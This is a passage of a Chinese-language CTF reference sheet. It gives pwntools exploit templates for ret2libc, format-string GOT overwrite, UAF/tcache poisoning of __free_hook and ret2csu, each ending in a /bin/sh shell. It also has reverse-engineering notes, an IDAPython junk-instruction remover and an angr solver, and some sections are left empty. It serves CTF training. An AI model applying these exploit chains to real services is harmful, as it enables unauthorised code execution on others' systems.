### 三、PWN 各题型利用模板

**1. ret2libc (64位，有Canary+NX+PIE)**

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# 第一步：泄露libc基址
# 找pop rdi; ret 等gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]  # 栈对齐

# 构造泄露链
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])  # 返回main二次利用

p.sendlineafter(b'> ', payload)
p.recvline()
puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym['puts']
log.success(f"libc_base: {hex(libc_base)}")

# 第二步：getshell
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = b'A' * offset
payload += p64(ret_gadget)      # 16字节栈对齐
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)
p.interactive()
```

**2. 格式化字符串（64位，任意地址写）**

```python
from pwn import *

context.arch = 'amd64'

# 先确定偏移
def find_offset():
    for i in range(1, 50):
        p = process('./binary')
        p.sendlineafter(b'> ', f'AAAABBBB%{i}$p'.encode())
        data = p.recvall()
        if b'42424242' in data or b'BBBB' in str(data):
            p.close()
            return i
        p.close()
    return -1

offset = find_offset()
log.info(f"offset: {offset}")

# 利用：改写printf@GOT为system
payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})
p.sendline(payload)
# 之后程序调用 printf("/bin/sh") 就等于 system("/bin/sh")
p.sendline(b'/bin/sh')
p.interactive()
```

**3. UAF + Tcache Poisoning**

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./binary')
libc = ELF('./libc.so.6')

# 假设程序有add/edit/delete/show功能
# 函数签名类似:
# add(index, size, content)
# delete(index)
# show(index)
# edit(index, content)

# === 第一步：泄露libc基址 ===
# 申请一个大chunk（进入unsorted bin），释放后fd/bk指向main_arena
add(0, 0x90, b'A' * 0x20)      # chunk0: 0x90大小
add(1, 0x20, b'B' * 0x10)      # chunk1: 防止与top chunk合并

delete(0)                       # 释放chunk0
data = show(0)                  # UAF读取fd/bk
libc_leak = u64(data[:8])
libc_base = libc_leak - 0x3ebca0  # main_arena偏移（不同libc不同）
log.success(f"libc_base: {hex(libc_base)}")

# === 第二步：Tcache poisoning 任意地址写 ===
# 利用UAF修改tcache中chunk的fd指针
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

add(2, 0x20, b'C' * 0x10)       # 申请一个tcache大小的chunk
delete(2)                       # 释放，进入tcache
edit(2, p64(free_hook))         # UAF修改fd为free_hook

add(3, 0x20, b'D' * 0x10)       # 从tcache取出，fd被修改
add(4, 0x20, p64(system))       # 这个chunk分配在free_hook处！

# 现在free_hook = system
# 调用free时就会执行system
add(5, 0x20, b'/bin/sh\x00')
delete(5)                       # free("/bin/sh") → system("/bin/sh")

p.interactive()
```

**4. ret2csu（寄存器不够用时）**

```python
from pwn import *

context.arch = 'amd64'
elf = ELF('./binary')

# __libc_csu_init 中的通用gadget
# csu_gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# csu_gadget2: mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15 + rbx*8]
csu1 = 0x40056a  # 需根据实际二进制查找
csu2 = 0x400550

def ret2csu(call_got, rdi, rsi, rdx):
    payload = b''
    payload += p64(csu1)
    payload += p64(0)              # rbx = 0
    payload += p64(1)              # rbp = 1 (防止循环)
    payload += p64(rdi)            # r12 → edi
    payload += p64(rsi)            # r13 → rsi
    payload += p64(rdx)            # r14 → rdx
    payload += p64(call_got)       # r15 → GOT表地址（函数指针）
    payload += p64(csu2)
    payload += p64(0) * 7          # 平衡栈（csu2后有6个pop+1个ret）
    return payload

# 用csu调用 read(0, bss_addr, 0x100)
payload += ret2csu(elf.got['read'], 0, bss_addr, 0x100)
```

### 四、逆向工程常用技巧速查

**1. 常见算法识别**

```
Base64编码特征:
- 查表: 有 64 字符的索引表（A-Za-z0-9+/）
- 移位: 每3字节转4字节，大量移位与与或运算
- 末尾补=

TEA/XTEA加密特征:
- 魔数: 0x9e3779b9 (delta)
- 32轮或64轮循环
- 大量的 +、<<、>>、^ 运算

AES加密特征:
- S盒: 256字节的查找表
- 轮常数: 0x01, 0x02, 0x04, 0x08...
- 4x4状态矩阵操作
- 列混合（乘2乘3查表）

RC4特征:
- 256字节S盒初始化
- i, j 两个指针
- 异或生成密钥流

MD5/SHA特征:
- 初始常量: 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476 (MD5)
- 64轮/80轮循环
- 大量逻辑函数（F, G, H, I）

CRC校验特征:
- 256项的CRC表
- 多项式: 0xEDB88320 (CRC32)
- 逐字节查表异或
```

**2. 快速定位关键函数**

```
方法1: 字符串交叉引用
- 搜索 "Wrong password" / "Congratulations" 等提示字符串

方法2: 导入函数分析

方法3: 主函数定位

- 找argc/argv参数传递模式

方法4: 动态调试
- 在关键API下断点
- 查看调用栈回溯
```

**3. 脱壳入门**

```
UPX 脱壳:
```

**4. 花指令去除**

```python
# 花指令常见模式:
# 1. 垃圾指令 + 条件跳转（永真/永假）
# 2. 跳入指令中间（破坏反汇编）
# 3. 无效前缀指令

# 手动去除步骤:
# 1. 分析跳转目标是否合理
# 2. 将永假跳转的目标处改为NOP
# 3. 重新分析代码（Undefine + Make code）

# IDAPython 批量去除简单花指令
import idautils
import idc
import idaapi

def remove_junk_jumps():
    """去除永真/永假跳转"""
    for seg in idautils.Segments():
        start = idc.get_segm_start(seg)
        end = idc.get_segm_end(seg)
        ea = start
        while ea < end:
            mnem = idc.print_insn_mnem(ea)
            # 查找jz后紧跟jnz到同一地址的模式
            if mnem == 'jz':
                jz_target = idc.get_operand_value(ea, 0)
                next_ea = idc.next_head(ea)
                if idc.print_insn_mnem(next_ea) == 'jnz':
                    jnz_target = idc.get_operand_value(next_ea, 0)
                    if jz_target == jnz_target:
                        # 这是永真跳转，用NOP填充
                        idc.patch_byte(ea, 0x90)
                        idc.patch_byte(next_ea, 0x90)
            ea = idc.next_head(ea)
```

### 五、angr 解CTF逆向题速查

```python
import angr
import claripy

# 加载二进制
proj = angr.Project('./binary', auto_load_libs=False)

# 创建符号输入
flag_len = 32
flag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(flag_len)]
flag = claripy.Concat(*flag_chars + [claripy.BVV(b'\n')])

# 创建初始状态
state = proj.factory.entry_state(stdin=flag)

# 添加约束（可打印字符）
for c in flag_chars:
    state.solver.add(c >= 0x20)  # 可打印字符范围
    state.solver.add(c <= 0x7e)

# 创建Simulation Manager
simgr = proj.factory.simulation_manager(state)

# 定义成功/失败地址
success_addr = 0x401234  # 输出 "Correct!" 的地址
fail_addr = 0x401300     # 输出 "Wrong!" 的地址

# 探索
simgr.explore(find=success_addr, avoid=fail_addr)

# 输出结果
if simgr.found:
    found = simgr.found[0]
    solution = found.solver.eval(flag, cast_to=bytes)
    print(f"Flag: {solution}")
else:
    print("No solution found")

# === 进阶：使用Veritesting处理循环 ===
simgr = proj.factory.simulation_manager(state)
simgr.use_technique(angr.exploration_techniques.Veritesting())
```
